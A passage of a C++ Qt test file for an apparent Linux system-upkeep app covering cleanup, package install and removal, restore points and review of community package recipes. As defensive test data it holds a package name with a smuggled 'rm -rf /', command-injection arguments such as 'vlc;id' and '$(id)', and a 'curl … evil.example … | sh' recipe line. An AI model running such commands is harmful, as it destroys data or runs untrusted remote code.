// SPDX-License-Identifier: GPL-2.0-or-later
//
// The upkeep cards past the Update card, read from what the computer's own
// programs print, and run with scripts of the test's own or with stand-ins for
// the system's programs on the PATH: nothing here looks at or changes this
// computer. Files are made and removed only inside the test's own home.
#include "app/AppInstall.h"
#include "app/CommunityApps.h"
#include "app/Conversation.h"
#include "app/HealthCheck.h"
#include "app/RecentChanges.h"
#include "app/RestorePoints.h"
#include "app/SpaceCleanup.h"

#include <QDir>
#include <QFile>
#include <QProcess>
#include <QSettings>
#include <QSignalSpy>
#include <QTemporaryDir>
#include <QTest>

#include "AdminStandIn.h"

#include <algorithm>
#include <QTimeZone>

using namespace splitrock;

namespace {

QString fixture(const QString &name)
{
    QFile file(QStringLiteral(FIXTURES_DIR "/chores/") + name);
    return file.open(QIODevice::ReadOnly) ? QString::fromUtf8(file.readAll()) : QString();
}

const QDateTime Now = QDateTime(QDate(2026, 10, 9), QTime(21, 0), QTimeZone::utc());

// A script that prints a fixture.
QString printing(const QString &name)
{
    return QStringLiteral("cat '" FIXTURES_DIR "/chores/") + name + QLatin1Char('\'');
}

bool write(const QString &path, const QString &text, bool executable = false)
{
    QDir().mkpath(QFileInfo(path).absolutePath());
    QFile file(path);
    if (!file.open(QIODevice::WriteOnly | QIODevice::Truncate))
        return false;
    file.write(text.toUtf8());
    file.close();
    if (executable)
        file.setPermissions(file.permissions() | QFileDevice::ExeOwner);
    return true;
}

// Stand-ins for the system's programs, first on the PATH while the test runs.
class StandIns
{
public:
    StandIns()
        : m_path(qEnvironmentVariable("PATH"))
    {
        qputenv("PATH", (m_dir.path() + QLatin1Char(':') + m_path).toLocal8Bit());
    }
    ~StandIns() { qputenv("PATH", m_path.toLocal8Bit()); }
    bool add(const QString &name, const QString &script)
    {
        return write(m_dir.filePath(name), QStringLiteral("#!/bin/sh\n") + script, true);
    }
    QString path() const { return m_dir.path(); }

private:
    QTemporaryDir m_dir;
    QString m_path;
};

bool git(const QString &dir, const QStringList &arguments)
{
    QProcess p;
    p.setWorkingDirectory(dir);
    p.start(QStringLiteral("git"), QStringList{QStringLiteral("-c"), QStringLiteral("user.name=Test"), QStringLiteral("-c"),
                                               QStringLiteral("user.email=test@example.invalid"), QStringLiteral("-c"),
                                               QStringLiteral("init.defaultBranch=master")}
                                       + arguments);
    return p.waitForFinished(20000) && p.exitStatus() == QProcess::NormalExit && p.exitCode() == 0;
}

QString gitOut(const QString &dir, const QStringList &arguments)
{
    QProcess p;
    p.setWorkingDirectory(dir);
    p.start(QStringLiteral("git"), arguments);
    p.waitForFinished(20000);
    return QString::fromUtf8(p.readAllStandardOutput()).trimmed();
}

QString srcinfo(const QString &version)
{
    return QStringLiteral("pkgbase = demo\n\tpkgver = %1\n\tpkgrel = 1\n\tsource = https://example.org/demo-%1.tar.gz\n"
                          "pkgname = demo\n").arg(version);
}

} // namespace

class TestChores : public QObject
{
    Q_OBJECT

private Q_SLOTS:
    void initTestCase()
    {
        // Only ever the test's own home.
        QVERIFY(!qEnvironmentVariable("SPLIT_ROCK_TEST_HOME").isEmpty());
        QCOMPARE(QDir::homePath(), qEnvironmentVariable("SPLIT_ROCK_TEST_HOME"));
    }

    void sizesAreReadAndSaid()
    {
        QCOMPARE(SpaceCleanup::readSize(QStringLiteral("take up 1.5G in the file system.")), qint64(1.5 * 1024 * 1024));
        QCOMPARE(SpaceCleanup::readSize(QStringLiteral("412.5 MiB")), qint64(412.5 * 1024));
        QCOMPARE(SpaceCleanup::readSize(QStringLiteral("nothing")), qint64(-1));
        QCOMPARE(Chore::size(3 * 1024 * 1024 + 300 * 1024), QStringLiteral("3.3 GB"));
        QCOMPARE(Chore::size(500 * 1024), QStringLiteral("500 MB"));
    }

    void spaceListsLeftoversBiggestFirst()
    {
        const SpaceCleanup::Look look = SpaceCleanup::readLook(fixture(QStringLiteral("space-look.txt")));
        QCOMPARE(look.freeKb, qint64(48000000));
        QStringList ids;
        for (const SpaceCleanup::Item &item : look.items)
            ids.append(item.id);
        QCOMPARE(ids, (QStringList{QStringLiteral("pkgcache"), QStringLiteral("journal"), QStringLiteral("cache"),
                                   QStringLiteral("builds"), QStringLiteral("trash"), QStringLiteral("crashes"),
                                   QStringLiteral("orphans"), QStringLiteral("apps")}));
        const auto item = [&look](const QString &id) {
            return *std::find_if(look.items.cbegin(), look.items.cend(), [&id](const auto &i) { return i.id == id; });
        };
        QCOMPARE(item(QStringLiteral("pkgcache")).count, 47);
        // 200 MB of logs stay.
        QCOMPARE(item(QStringLiteral("journal")).kb, qint64(1.4 * 1024 * 1024) - 200 * 1024);
        // Parts nothing uses and the trash wait for the person to pick them.
        QVERIFY(!item(QStringLiteral("orphans")).chosen);
        QCOMPARE(item(QStringLiteral("orphans")).list, (QStringList{QStringLiteral("python-pip"), QStringLiteral("qt5-tools")}));
        QVERIFY(!item(QStringLiteral("trash")).chosen);
        QCOMPARE(item(QStringLiteral("trash")).count, 3);
        QCOMPARE(item(QStringLiteral("apps")).list,
                 (QStringList{QStringLiteral("org.kde.Platform"), QStringLiteral("org.freedesktop.Platform")}));
        QVERIFY(item(QStringLiteral("pkgcache")).admin);
        QVERIFY(!item(QStringLiteral("cache")).admin);

        // A name that isn't a package's is never offered.
        QString look2 = fixture(QStringLiteral("space-look.txt"));
        look2.replace(QStringLiteral("qt5-tools"), QStringLiteral("qt5-tools; rm -rf /"));
        const SpaceCleanup::Look odd = SpaceCleanup::readLook(look2);
        const auto orphans = std::find_if(odd.items.cbegin(), odd.items.cend(), [](const auto &i) { return i.id == QLatin1String("orphans"); });
        QCOMPARE(orphans->list, QStringList{QStringLiteral("python-pip")});
    }

    void spaceClearsWhatIsChosen()
    {
        // Old and new cache files in the test's own home.
        const QString cache = QDir::homePath() + QStringLiteral("/.cache");
        QVERIFY(write(cache + QStringLiteral("/someapp/old.bin"), QStringLiteral("old")));
        QVERIFY(write(cache + QStringLiteral("/someapp/new.bin"), QStringLiteral("new")));
        QVERIFY(write(cache + QStringLiteral("/paru/clone/demo/PKGBUILD"), QStringLiteral("x")));
        QVERIFY(QProcess::execute(QStringLiteral("touch"), {QStringLiteral("-a"), QStringLiteral("-d"), QStringLiteral("40 days ago"),
                                                           cache + QStringLiteral("/someapp/old.bin")}) == 0);

        // The administrator's real job, with what it runs stood in for.
        StandIns standIns;
        QVERIFY(standIns.add(QStringLiteral("paccache"), QStringLiteral("echo \"paccache $*\"\n")));
        QVERIFY(standIns.add(QStringLiteral("snapper"), QStringLiteral("exit 1\n")));
        QVERIFY(standIns.add(QStringLiteral("pacman"), QStringLiteral(
            "case $1 in -Qdtq) echo python-pip ;; *) echo \"pacman $*\" ;; esac\n")));
        SpaceCleanup space;
        space.setElevate({});
        space.setAdmin(adminInSource());
        space.setLookScript(printing(QStringLiteral("space-look.txt")));
        space.setFreeScript(QStringLiteral("echo 49048576"));
        QStringList written;
        space.setWriteDown([&written](const QString &id, const QString &title, const QString &undo, QString *) {
            written << id << title << undo;
            return true;
        });
        bool reported = false;
        space.setReport([&reported](const QString &, bool ok, const QString &, const QString &) { reported = ok; });

        space.check();
        QTRY_COMPARE(space.stage(), QStringLiteral("ready"));
        QVERIFY(space.needsPassword());
        // Only the person's own and the old copies; nothing of the real
        // computer's runs as the test.
        space.choose(QStringLiteral("journal"), false);
        space.choose(QStringLiteral("crashes"), false);
        space.choose(QStringLiteral("apps"), false);
        space.choose(QStringLiteral("orphans"), true);
        space.start();
        QCOMPARE(space.stage(), QStringLiteral("clearing"));
        space.close();
        QCOMPARE(space.stage(), QStringLiteral("clearing"));
        QTRY_COMPARE(space.stage(), QStringLiteral("done"));
        QVERIFY(reported);
        QCOMPARE(space.freed(), QStringLiteral("1.0 GB"));
        QVERIFY(written.value(1).startsWith(QStringLiteral("Freed up space: ")));
        QVERIFY(written.value(2).contains(QStringLiteral("python-pip")));
        // The jobs, then of the parts the person saw only those still unused.
        QVERIFY(space.log().contains(QStringLiteral("paccache -rk1")));
        QVERIFY2(space.log().contains(QStringLiteral("pacman -Rns --noconfirm --noprogressbar --color never -- python-pip\n")),
                 qPrintable(space.log()));
        // Unused for a month goes; the rest, and community build files kept
        // until chosen, stay.
        QVERIFY(!QFile::exists(cache + QStringLiteral("/someapp/old.bin")));
        QVERIFY(QFile::exists(cache + QStringLiteral("/someapp/new.bin")));
        QVERIFY(!QFile::exists(cache + QStringLiteral("/paru/clone")));
        QDir(cache).removeRecursively();
    }

    // The administrator's jobs take only their checked arguments: anything
    // else is refused before a thing runs.
    void theAdministratorTakesOnlyItsNamedJobs()
    {
        StandIns standIns;
        const QString ran = standIns.path() + QStringLiteral("/ran");
        for (const char *tool : {"pacman", "snapper", "paccache", "journalctl", "find", "makepkg", "git"})
            QVERIFY(standIns.add(QString::fromLatin1(tool), QStringLiteral("echo \"$0 $*\" >> '%1'\n").arg(ran)));
        QTemporaryDir logs;
        const auto job = [&logs](const QStringList &arguments) {
            QProcess p;
            QProcessEnvironment env = QProcessEnvironment::systemEnvironment();
            env.insert(QStringLiteral("SPLIT_ROCK_ADMIN_LOGS"), logs.path());
            p.setProcessEnvironment(env);
            p.start(adminInSource().first(), arguments);
            p.closeWriteChannel();
            if (!p.waitForFinished(20000))
                return -1;
            return p.exitCode();
        };
        const QString name = QStringLiteral("Split Rock");
        const QString head = QStringLiteral("0123456789abcdef0123456789abcdef01234567");
        const QList<QStringList> refused{
            {},
            {QStringLiteral("sh"), QStringLiteral("-c"), QStringLiteral("id")},
            {QStringLiteral("update")},
            {QStringLiteral("update"), name, QStringLiteral("2")},
            {QStringLiteral("update"), QStringLiteral("Anyone"), QStringLiteral("1")},
            {QStringLiteral("update"), name, QStringLiteral("1"), QStringLiteral("--overwrite=*")},
            {QStringLiteral("install"), name, QStringLiteral("1"), QStringLiteral("--config=/tmp/x")},
            {QStringLiteral("install"), name, QStringLiteral("1"), QStringLiteral("vlc;id")},
            {QStringLiteral("install"), name, QStringLiteral("1"), QStringLiteral("vlc id")},
            {QStringLiteral("install"), name, QStringLiteral("1"), QStringLiteral("vlc\nid")},
            {QStringLiteral("install"), name, QStringLiteral("1"), QStringLiteral("VLC")},
            {QStringLiteral("install"), name, QStringLiteral("1"), QStringLiteral("$(id)")},
            {QStringLiteral("install"), name, QStringLiteral("1"), QStringLiteral("vlc"), QStringLiteral("gimp")},
            {QStringLiteral("remove"), name, QStringLiteral("1"), QStringLiteral(".hidden")},
            {QStringLiteral("free-space"), name, QStringLiteral("1"), QStringLiteral("everything")},
            {QStringLiteral("free-space"), name, QStringLiteral("1"), QStringLiteral("--"), QStringLiteral("-dd")},
            {QStringLiteral("restore-list"), QStringLiteral("now")},
            {QStringLiteral("restore-undo"), QStringLiteral("8"), QStringLiteral("7")},
            {QStringLiteral("restore-undo"), QStringLiteral("0"), QStringLiteral("7")},
            {QStringLiteral("restore-undo"), QStringLiteral("1"), QStringLiteral("2..9")},
            {QStringLiteral("community"), name, QStringLiteral("1"), logs.path(), QStringLiteral("abc"), QStringLiteral("--"),
             QStringLiteral("demo")},
            {QStringLiteral("community"), name, QStringLiteral("1"), logs.path() + QStringLiteral("/../x"), head,
             QStringLiteral("--"), QStringLiteral("demo")},
            {QStringLiteral("community"), name, QStringLiteral("1"), logs.path(), head, QStringLiteral("--")},
            {QStringLiteral("community"), name, QStringLiteral("1"), logs.path(), head, QStringLiteral("x;y"),
             QStringLiteral("--"), QStringLiteral("demo")},
        };
        for (const QStringList &arguments : refused)
            QVERIFY2(job(arguments) == 2, qPrintable(arguments.join(QLatin1Char('|'))));
        QVERIFY2(!QFile::exists(ran), qPrintable(QStringLiteral("something ran")));

        // The ones it was made for do run.
        QCOMPARE(job({QStringLiteral("install"), name, QStringLiteral("0"), QStringLiteral("lib32-gcc-libs")}), 0);
        QCOMPARE(job({QStringLiteral("restore-undo"), QStringLiteral("7"), QStringLiteral("8")}), 0);
        QFile file(ran);
        QVERIFY(file.open(QIODevice::ReadOnly));
        const QString said = QString::fromUtf8(file.readAll());
        QVERIFY2(said.contains(QStringLiteral("pacman -S --needed --noconfirm --noprogressbar --color never -- lib32-gcc-libs")),
                 qPrintable(said));
        QVERIFY(said.contains(QStringLiteral("snapper -c root undochange 7..8")));
    }

    void installFindsAppsBestFirst()
    {
        const QList<AppInstall::App> apps = AppInstall::readSearch(fixture(QStringLiteral("install-search.txt")),
                                                                   QStringLiteral("pdf editor"));
        QStringList keys;
        for (const AppInstall::App &a : apps)
            keys.append(a.key);
        // The library is no app; Okular is on the shelf, so Flathub's copy
        // isn't listed again.
        QCOMPARE(keys, (QStringList{QStringLiteral("flathub:net.code_industry.MasterPDFEditor"), QStringLiteral("shelf:pdfarranger"),
                                    QStringLiteral("shelf:okular"), QStringLiteral("flathub:com.github.xournalpp.xournalpp")}));
        QVERIFY(apps.at(2).installed);
        QVERIFY(apps.at(2).alsoFlathub);
        QVERIFY(!apps.at(1).installed);
    }

    void installRunsThroughTheTransaction()
    {
        // The real transaction, with pacman stood in for.
        StandIns standIns;
        QVERIFY(standIns.add(QStringLiteral("pacman"), QStringLiteral(
            "echo \"pacman $*\"\necho 'Packages (1) pdfarranger-1.11-1'\necho 'installing pdfarranger...'\n"
            "echo ':: Running post-transaction hooks...'\n")));
        QTemporaryDir logs;
        AppInstall install;
        install.setElevate({});
        install.setAdmin(adminInSource());
        install.setLogFolder(logs.path());
        install.setSearchScript(printing(QStringLiteral("install-search.txt")));
        QString title;
        install.setWriteDown([&title](const QString &, const QString &t, const QString &, QString *) {
            title = t;
            return true;
        });
        install.search(QStringLiteral("pdf"));
        QCOMPARE(install.stage(), QStringLiteral("searching"));
        QTRY_COMPARE(install.stage(), QStringLiteral("results"));
        // One already installed isn't installed again.
        install.install(QStringLiteral("shelf:okular"));
        QCOMPARE(install.stage(), QStringLiteral("results"));
        install.install(QStringLiteral("shelf:pdfarranger"));
        QCOMPARE(install.stage(), QStringLiteral("installing"));
        QTRY_COMPARE(install.stage(), QStringLiteral("done"));
        QCOMPARE(title, QStringLiteral("Installed PDF Arranger"));
        QVERIFY(install.log().contains(QStringLiteral("pacman -S --needed --noconfirm --noprogressbar --color never -- pdfarranger")));
        QVERIFY(install.pickedMap().value(QStringLiteral("installed")).toBool());
        QVERIFY(QFile::exists(logs.filePath(QStringLiteral("split-rock-install.log"))));
    }

    void anAppIsRemovedAfterAYes()
    {
        QCOMPARE(AppInstall::withoutRemoveWords(QStringLiteral("Please uninstall the MaiN Keyboard app")),
                 QStringLiteral("MaiN Keyboard"));
        // The polite words around the name go.
        QCOMPARE(AppInstall::withoutRemoveWords(QStringLiteral("Can you uninstall MaiN keyboard for me?")),
                 QStringLiteral("MaiN keyboard"));
        QCOMPARE(AppInstall::withoutRemoveWords(QStringLiteral("Could you just remove VLC from my laptop now, thanks")),
                 QStringLiteral("VLC"));
        QVERIFY(AppInstall::asksToRemove(QStringLiteral("uninstall MaiN keyboard")));
        QVERIFY(!AppInstall::asksToRemove(QStringLiteral("a pdf editor")));
        QVERIFY(AppInstall::keptBySystem(QStringLiteral("linux-cachyos")));
        QVERIFY(AppInstall::keptBySystem(QStringLiteral("plasma-workspace")));
        QVERIFY(!AppInstall::keptBySystem(QStringLiteral("main-keyboard-git")));

        // An app from outside the shelf is found by its own name.
        const QList<AppInstall::App> found = AppInstall::readSearch(fixture(QStringLiteral("remove-search.txt")),
                                                                    QStringLiteral("MaiN Keyboard"));
        QVERIFY(std::any_of(found.cbegin(), found.cend(), [](const AppInstall::App &a) {
            return a.key == QLatin1String("shelf:main-keyboard-git") && a.installed;
        }));

        StandIns standIns;
        QVERIFY(standIns.add(QStringLiteral("pacman"), QStringLiteral(
            "echo \"pacman $*\"\necho 'removing main-keyboard-git...'\n")));
        QTemporaryDir logs;
        AppInstall install;
        install.setElevate({});
        install.setAdmin(adminInSource());
        install.setLogFolder(logs.path());
        install.setSearchScript(printing(QStringLiteral("remove-search.txt")));
        QString title;
        install.setWriteDown([&title](const QString &, const QString &t, const QString &, QString *) {
            title = t;
            return true;
        });
        install.search(QStringLiteral("uninstall MaiN Keyboard"));
        QVERIFY(install.removing());
        QCOMPARE(install.query(), QStringLiteral("MaiN Keyboard"));
        QTRY_COMPARE(install.stage(), QStringLiteral("results"));
        // Only what is installed, and never the system's own.
        for (const AppInstall::App &a : install.results()) {
            QVERIFY(a.installed);
            QVERIFY(!AppInstall::keptBySystem(a.package));
        }
        // Nothing is removed before the yes.
        install.remove(QStringLiteral("shelf:main-keyboard-git"));
        QCOMPARE(install.stage(), QStringLiteral("confirm"));
        QVERIFY(title.isEmpty());
        install.back();
        QCOMPARE(install.stage(), QStringLiteral("results"));
        install.remove(QStringLiteral("shelf:main-keyboard-git"));
        install.confirmRemove();
        QCOMPARE(install.stage(), QStringLiteral("removing"));
        QTRY_COMPARE(install.stage(), QStringLiteral("removed"));
        QCOMPARE(title, QStringLiteral("Removed main-keyboard-git"));
        QVERIFY(install.log().contains(QStringLiteral("pacman -Rns --noconfirm --noprogressbar --color never -- main-keyboard-git")));
    }

    void restorePointsSayWhatCameNext()
    {
        const RestorePoints::Look look = RestorePoints::readLook(fixture(QStringLiteral("restore-look.txt")));
        QVERIFY(look.configured);
        QCOMPARE(look.menu, QStringLiteral("limine"));
        QCOMPARE(look.keepTool, QStringLiteral("btrfs-assistant-launcher"));
        QCOMPARE(look.bootedFrom, -1);
        QVERIFY(look.homeSeparate);
        // Pairs are one point; the one after is left out, newest first.
        QCOMPARE(look.points.size(), 3);
        QCOMPARE(look.points.at(0).number, 313);
        QCOMPARE(look.points.at(0).what, QStringLiteral("Before updating the computer"));
        QCOMPARE(look.points.at(1).what, QStringLiteral("Before installing okular"));
        QCOMPARE(look.points.at(2).kind, QStringLiteral("timeline"));
        // Which are Split Rock's own, and how many the system keeps.
        QVERIFY(look.points.at(0).own);
        QVERIFY(!look.points.at(1).own);
        QVERIFY(look.cleanup);
        QCOMPARE(look.limit, 50);
        QCOMPARE(look.limitImportant, 15);

        QCOMPARE(RestorePoints::describe(QStringLiteral("pacman -Rns qt5-tools python-pip"), QStringLiteral("number")),
                 QStringLiteral("Before removing qt5-tools, python-pip"));
        QCOMPARE(RestorePoints::describe(QStringLiteral("pacman -Syu"), QStringLiteral("number")),
                 QStringLiteral("Before updating the computer"));
        QCOMPARE(RestorePoints::describe(QStringLiteral("Split Rock: Install okular"), QStringLiteral("number")),
                 QStringLiteral("Before installing okular"));
        QCOMPARE(RestorePoints::describe(QStringLiteral("Genie: Remove main-keyboard-git"), QStringLiteral("number")),
                 QStringLiteral("Before removing main-keyboard-git"));
        // A helper's long words, and the package files it built, read plainly.
        QCOMPARE(RestorePoints::describe(QStringLiteral("pacman --upgrade --color=always --noconfirm -- "
                                                        "/home/user/.cache/paru/clone/thing/thing-1-1-x86_64.pkg.tar.zst"),
                                         QStringLiteral("number")),
                 QStringLiteral("Before installing a community app"));
        QCOMPARE(RestorePoints::describe(QStringLiteral("pacman --sync --needed vlc"), QStringLiteral("number")),
                 QStringLiteral("Before installing vlc"));
        QVERIFY(RestorePoints::isOwn(QStringLiteral("Genie: Update")));
        QVERIFY(!RestorePoints::isOwn(QStringLiteral("pacman -Syu")));

        // Started from one: the computer runs on its snapshot.
        QString booted = fixture(QStringLiteral("restore-look.txt"));
        booted.replace(QStringLiteral("rootflags=subvol=/@"), QStringLiteral("rootflags=subvol=/@/.snapshots/313/snapshot"));
        QCOMPARE(RestorePoints::readLook(booted).bootedFrom, 313);

        // Listing needs the password where the person may not.
        QCOMPARE(RestorePoints::readLook(QStringLiteral("@@ snapper\nyes\n@@ list\nNo permissions.\n@@ end\n")).denied, true);
    }

    void goingBackSaysWhereToTap()
    {
        RestorePoints restore;
        restore.setLookScript(printing(QStringLiteral("restore-look.txt")));
        restore.check();
        QTRY_COMPARE(restore.stage(), QStringLiteral("ready"));
        restore.choose(311);
        QCOMPARE(restore.stage(), QStringLiteral("chosen"));
        const QStringList steps = restore.steps();
        QVERIFY(steps.join(QLatin1Char(' ')).contains(QStringLiteral("open Snapshots")));
        QVERIFY(steps.join(QLatin1Char(' ')).contains(QStringLiteral("number 311")));
        restore.back();
        QCOMPARE(restore.stage(), QStringLiteral("ready"));
    }

    void theHealthCheckReadsEachPart()
    {
        const QList<HealthCheck::Item> items = HealthCheck::readLook(fixture(QStringLiteral("health-look.txt")), Now);
        QMap<QString, HealthCheck::Item> byId;
        for (const HealthCheck::Item &i : items)
            byId.insert(i.id, i);
        // A problem first.
        QCOMPARE(items.first().id, QStringLiteral("services"));
        QCOMPARE(byId.value(QStringLiteral("services")).state, QStringLiteral("bad"));
        QVERIFY(byId.value(QStringLiteral("services")).question.contains(QStringLiteral("bluetooth-autoconnect.service")));
        QCOMPARE(byId.value(QStringLiteral("space")).state, QStringLiteral("warn"));
        QCOMPARE(byId.value(QStringLiteral("space")).action, QStringLiteral("space"));
        QCOMPARE(byId.value(QStringLiteral("drive")).state, QStringLiteral("good"));
        QVERIFY(byId.value(QStringLiteral("battery")).detail.contains(QStringLiteral("86%")));
        QVERIFY(byId.value(QStringLiteral("battery")).detail.contains(QStringLiteral("312 charges")));
        QCOMPARE(byId.value(QStringLiteral("updates")).state, QStringLiteral("warn"));
        QCOMPARE(byId.value(QStringLiteral("updates")).action, QStringLiteral("update"));
        QCOMPARE(byId.value(QStringLiteral("restore")).state, QStringLiteral("good"));
        QCOMPARE(byId.value(QStringLiteral("settings")).state, QStringLiteral("warn"));
        QVERIFY(byId.value(QStringLiteral("crashes")).detail.contains(QStringLiteral("plasmashell (2)")));
        QCOMPARE(byId.value(QStringLiteral("pkgcache")).action, QStringLiteral("space"));

        // Without restore points, it says so.
        QString none = fixture(QStringLiteral("health-look.txt"));
        none.replace(QStringLiteral("@@ snapper\nyes\n"), QStringLiteral("@@ snapper\n"));
        const QList<HealthCheck::Item> without = HealthCheck::readLook(none, Now);
        QVERIFY(std::any_of(without.cbegin(), without.cend(), [](const auto &i) {
            return i.id == QLatin1String("restore") && i.state == QLatin1String("warn");
        }));
    }

    void theHealthCheckRunsQuietlyOnceAWeek()
    {
        QSettings(QStringLiteral("split-rock"), QStringLiteral("upkeep")).remove(QStringLiteral("health"));
        HealthCheck health;
        health.setLookScript(printing(QStringLiteral("health-look.txt")));
        health.checkIfDue();
        QTRY_VERIFY(!health.lastChecked().isEmpty());
        QVERIFY(health.attention() > 0);
        // Quietly: the card stays closed.
        QCOMPARE(health.stage(), QString());
        QCOMPARE(health.lastChecked(), QStringLiteral("Today"));
        // Not again within the week.
        HealthCheck again;
        again.setLookScript(QStringLiteral("exit 1"));
        again.checkIfDue();
        QVERIFY(!again.busy());
        // Asked for, it opens.
        health.check();
        QCOMPARE(health.stage(), QStringLiteral("looking"));
        QTRY_COMPARE(health.stage(), QStringLiteral("done"));
    }

    void versionsCompareAsPacmanDoes()
    {
        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.104.0-1"), QStringLiteral("1.105.1-1")) < 0);
        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1:1.0-1"), QStringLiteral("2.0-1")) > 0);
        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.0a-1"), QStringLiteral("1.0-1")) < 0);
        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.0-1"), QStringLiteral("1.0.1-1")) < 0);
        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.0-2"), QStringLiteral("1.0-1")) > 0);
        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.010-1"), QStringLiteral("1.9-1")) > 0);
        QCOMPARE(CommunityApps::compareVersions(QStringLiteral("2.3.4-1"), QStringLiteral("2.3.4-1")), 0);
        QCOMPARE(CommunityApps::compareVersions(QStringLiteral("1.2"), QStringLiteral("1.2-3")), 0);
    }

    void communityAppsListWhatHasANewerRecipe()
    {
        const CommunityApps::Look look = CommunityApps::readLook(fixture(QStringLiteral("community-look.txt")));
        QVERIFY(look.reached);
        QCOMPARE(look.apps.size(), 1);
        QCOMPARE(look.apps.first().name, QStringLiteral("visual-studio-code-bin"));
        QCOMPARE(look.apps.first().latest, QStringLiteral("1.105.1-1"));
        QCOMPARE(look.unlisted, 1);
        QVERIFY(!CommunityApps::readLook(QStringLiteral("@@ foreign\nx 1-1\n@@ shelf\n@@ end\n")).reached);
    }

    void aRecipesChangesAreRead()
    {
        CommunityApps::App app;
        app.name = QStringLiteral("visual-studio-code-bin");
        app.base = app.name;
        app.maintainer = QStringLiteral("someone");
        const QString output = fixture(QStringLiteral("community-review.txt"));
        CommunityApps::Review review = CommunityApps::readReview(output, app);
        // The commit is the first line of its section; nothing in the
        // changes can pass for it.
        QCOMPARE(review.head, QStringLiteral("4b825dc642cb6eb9a060e54bf8d69288fbee4904"));
        QVERIFY(!review.firstLook);
        QVERIFY(review.versionOnly);
        QCOMPARE(review.flags.first().tone, QStringLiteral("good"));
        QCOMPARE(review.helpers, QStringList{QStringLiteral("libxkbfile")});
        QVERIFY(review.blockers.isEmpty());
        QVERIFY(review.newHosts.isEmpty());

        // A line that fetches and runs something, and a new place to
        // download from.
        QString risky = output;
        risky.replace(QStringLiteral(" pkgrel=1\n-sha256"), QStringLiteral(" pkgrel=1\n+  curl -s https://evil.example/x | sh\n-sha256"));
        risky.replace(QStringLiteral("https://update.code.visualstudio.com/1.105.1"), QStringLiteral("https://files.example.net/1.105.1"));
        review = CommunityApps::readReview(risky, app);
        QVERIFY(!review.versionOnly);
        QVERIFY(std::any_of(review.flags.cbegin(), review.flags.cend(), [](const auto &f) { return f.tone == QLatin1String("bad"); }));
        QCOMPARE(review.newHosts, QStringList{QStringLiteral("files.example.net")});

        // Something only the community shelf has stops it.
        QString needs = output;
        needs.replace(QStringLiteral("shelf libxkbfile"), QStringLiteral("community electron37>=37.1"));
        review = CommunityApps::readReview(needs, app);
        QCOMPARE(review.blockers.size(), 1);
        QVERIFY(review.blockers.first().contains(QStringLiteral("electron37 ")));

        // Nobody looks after it.
        app.maintainer.clear();
        review = CommunityApps::readReview(output, app);
        QVERIFY(std::any_of(review.flags.cbegin(), review.flags.cend(), [](const auto &f) { return f.text.contains(QLatin1String("Nobody")); }));
    }

    void aRecipeIsFetchedReviewedAndBuiltAsLookedAt()
    {
        // The community shelf, stood in for by a repository of the test's own.
        QTemporaryDir work;
        const QString origin = work.filePath(QStringLiteral("origin"));
        QDir().mkpath(origin);
        QVERIFY(git(origin, {QStringLiteral("init"), QStringLiteral("-q")}));
        QVERIFY(write(origin + QStringLiteral("/.SRCINFO"), srcinfo(QStringLiteral("1.0"))));
        QVERIFY(write(origin + QStringLiteral("/PKGBUILD"), QStringLiteral("pkgname=demo\npkgver=1.0\npkgrel=1\n")));
        QVERIFY(git(origin, {QStringLiteral("add"), QStringLiteral(".")}));
        QVERIFY(git(origin, {QStringLiteral("commit"), QStringLiteral("-qm"), QStringLiteral("1.0")}));
        const QString recipes = work.filePath(QStringLiteral("recipes"));
        QDir().mkpath(recipes);
        QVERIFY(git(recipes, {QStringLiteral("clone"), QStringLiteral("-q"), origin, QStringLiteral("demo")}));
        QVERIFY(write(origin + QStringLiteral("/.SRCINFO"), srcinfo(QStringLiteral("1.1"))));
        QVERIFY(write(origin + QStringLiteral("/PKGBUILD"), QStringLiteral("pkgname=demo\npkgver=1.1\npkgrel=1\n")));
        QVERIFY(git(origin, {QStringLiteral("commit"), QStringLiteral("-qam"), QStringLiteral("1.1")}));
        const QString head = gitOut(origin, {QStringLiteral("rev-parse"), QStringLiteral("HEAD")});

        StandIns standIns;
        QVERIFY(standIns.add(QStringLiteral("pacman"), QStringLiteral(
            "case $1 in\n"
            "  -T) exit 0 ;;\n"
            "  -Qqp) echo demo ;;\n"
            "  *) echo \"pacman $*\" ;;\n"
            "esac\n")));
        QVERIFY(standIns.add(QStringLiteral("makepkg"), QStringLiteral(
            "if [ \"$1\" = --packagelist ]; then echo \"$PWD/demo-1.1-1-any.pkg.tar.zst\"; exit 0; fi\n"
            "echo \"==> Making package: demo $(sed -n 's/^pkgver=//p' PKGBUILD)\"\n"
            "touch demo-1.1-1-any.pkg.tar.zst\n")));
        QTemporaryDir logs;

        CommunityApps community;
        community.setElevate({});
        community.setAdmin(adminInSource());
        community.setLogFolder(logs.path());
        community.setRecipes(recipes);
        community.setLookScript(QStringLiteral(
            "printf '@@ foreign\\ndemo 1.0-1\\n@@ shelf\\n{\"results\":[{\"Name\":\"demo\",\"PackageBase\":\"demo\","
            "\"Version\":\"1.1-1\",\"Maintainer\":\"someone\"}]}\\n@@ end\\n'"));
        community.check();
        QTRY_COMPARE(community.stage(), QStringLiteral("ready"));
        community.look(QStringLiteral("demo"));
        QCOMPARE(community.stage(), QStringLiteral("reviewing"));
        QTRY_COMPARE_WITH_TIMEOUT(community.stage(), QStringLiteral("reviewed"), 20000);
        const CommunityApps::Review review = community.review();
        QCOMPARE(review.head, head);
        QVERIFY(!review.firstLook);
        QVERIFY(review.versionOnly);
        QVERIFY(review.diff.contains(QStringLiteral("+pkgver=1.1")));

        community.start();
        QCOMPARE(community.stage(), QStringLiteral("updating"));
        QTRY_COMPARE_WITH_TIMEOUT(community.stage(), QStringLiteral("done"), 20000);
        QVERIFY(community.log().contains(QStringLiteral("==> Making package: demo 1.1")));
        QVERIFY(community.log().contains(QStringLiteral("pacman -U --noconfirm --noprogressbar --color never")));
        QCOMPARE(gitOut(recipes + QStringLiteral("/demo"), {QStringLiteral("rev-parse"), QStringLiteral("HEAD")}), head);
        // Done, it leaves the list.
        QVERIFY(community.apps().isEmpty());
    }

    // What changed: a day at a time, newest first, each with its way back.
    void whatChangedReadsEachDay()
    {
        QList<ChangeRunner::Record> records;
        ChangeRunner::Record pointer;
        pointer.id = QStringLiteral("c1");
        pointer.made = QDateTime(QDate(2026, 10, 9), QTime(11, 30));
